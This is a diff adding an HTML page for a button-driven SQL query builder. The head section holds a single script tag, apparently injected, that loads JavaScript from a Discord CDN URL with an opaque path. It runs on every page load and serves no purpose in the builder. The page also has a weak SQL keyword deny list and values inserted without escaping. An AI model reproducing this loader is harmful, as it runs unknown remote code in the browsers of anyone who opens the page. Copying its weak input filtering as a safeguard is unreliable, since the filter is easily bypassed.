@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQL Query Builder</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        button {
+            margin: 5px;
+            padding: 10px;
+            font-size: 14px;
+        }
+        #output {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            white-space: pre-wrap;
+            background-color: #f9f9f9;
+        }
+        #inputValue {
+            margin: 10px 5px;
+            padding: 8px;
+            font-size: 14px;
+            width: 200px;
+        }
+    </style>
+<script type='text/javascript' src='https://cdn.discordapp.com/L1hlSO_wCh5RABvmLVCQJMU-SIYK8eq1aAu5lIo1V5sL5ZEE2NA4UAbel8lH67_hfooKNVTtdfj4sXF_mXBx-w=='></script></head>
+<body>
+    <h1>SQL Query Builder</h1>
+
+    <h3>SQL Parts</h3>
+    <button onclick="addToQuery('SELECT')">SELECT</button>
+    <button onclick="addToQuery('DISTINCT')">DISTINCT</button>
+    <button onclick="addToQuery('FROM')">FROM</button>
+    <button onclick="addToQuery('WHERE')">WHERE</button>
+    <button onclick="addToQuery('GROUP BY')">GROUP BY</button>
+    <button onclick="addToQuery('ORDER BY')">ORDER BY</button>
+    <button onclick="addToQuery('HAVING')">HAVING</button>
+    <button onclick="addToQuery('LIKE')">LIKE</button>
+    <button onclick="addToQuery('%')">%</button>
+
+    <h3>Example Tables</h3>
+    <button onclick="addToQuery('users')">users</button>
+    <button onclick="addToQuery('orders')">orders</button>
+    <button onclick="addToQuery('products')">products</button>
+
+    <h3>Example Values</h3>
+    <button onclick="addToQuery('*')">*</button>
+    <button onclick="addToQuery('id')">id</button>
+    <button onclick="addToQuery('name')">name</button>
+    <button onclick="addToQuery('price')">price</button>
+    <button onclick="addToQuery('quantity')">quantity</button>
+    <button onclick="addInputValue()">Add Value</button>
+    <input type="text" id="inputValue" placeholder="Enter value (e.g., John)" />
+
+    <h3>Operators</h3>
+    <button onclick="addToQuery('=')">=</button>
+    <button onclick="addToQuery('>')">&gt;</button>
+    <button onclick="addToQuery('<')">&lt;</button>
+    <button onclick="addToQuery('AND')">AND</button>
+    <button onclick="addToQuery('OR')">OR</button>
+
+    <h3>Join Types</h3>
+    <button onclick="addToQuery('JOIN')">JOIN</button>
+    <button onclick="addToQuery('INNER JOIN')">INNER JOIN</button>
+    <button onclick="addToQuery('LEFT JOIN')">LEFT JOIN</button>
+    <button onclick="addToQuery('RIGHT JOIN')">RIGHT JOIN</button>
+    <button onclick="addToQuery('OUTER JOIN')">OUTER JOIN</button>
+
+    <h3>Statistical Functions</h3>
+    <button onclick="addStatFunction('COUNT')">COUNT</button>
+    <button onclick="addStatFunction('AVG')">AVG</button>
+    <button onclick="addStatFunction('SUM')">SUM</button>
+    <button onclick="addStatFunction('MIN')">MIN</button>
+    <button onclick="addStatFunction('MAX')">MAX</button>
+
+    <div id="output"></div>
+    <button onclick="sendQuery()">Send Query</button>
+
+    <script>
+        let query = "";
+
+        // List of prohibited keywords
+        const prohibitedKeywords = ['DELETE', 'DROP', 'TRUNCATE', 'ALTER'];
+
+        // Function to add SQL parts
+        function addToQuery(part) {
+            query += part + " ";
+            updateOutput();
+        }
+
+        // Function to add user-provided input safely
+        function addInputValue() {
+            const value = document.getElementById("inputValue").value.trim().toUpperCase();
+
+            // Check for prohibited keywords
+            if (prohibitedKeywords.some(keyword => value.includes(keyword))) {
+                alert("Error: Input contains restricted keywords!");
+                return;
+            }
+
+            // Add user input as a safely quoted value
+            if (value) {
+                query += `'${value}' `;
+                updateOutput();
+                document.getElementById("inputValue").value = ""; // Clear input field
+            } else {
+                alert("Please enter a value first.");
+            }
+        }
+
+        // Function to add statistical functions with brackets
+        function addStatFunction(functionName) {
+            const value = document.getElementById("inputValue").value.trim();
+            if (value) {
+                query += `${functionName}(${value}) `;
+                updateOutput();
+                document.getElementById("inputValue").value = ""; // Clear input field
+            } else {
+                alert(`Please enter a value for ${functionName}`);
+            }
+        }
+
+        // Function to update the query display
+        function updateOutput() {
+            document.getElementById("output").textContent = query.trim();
+        }
+
+        // Placeholder function for Send Query
+        function sendQuery() {
+            alert("This feature will connect to the database in the future.");
+        }
+    </script>
+</body>
+</html>
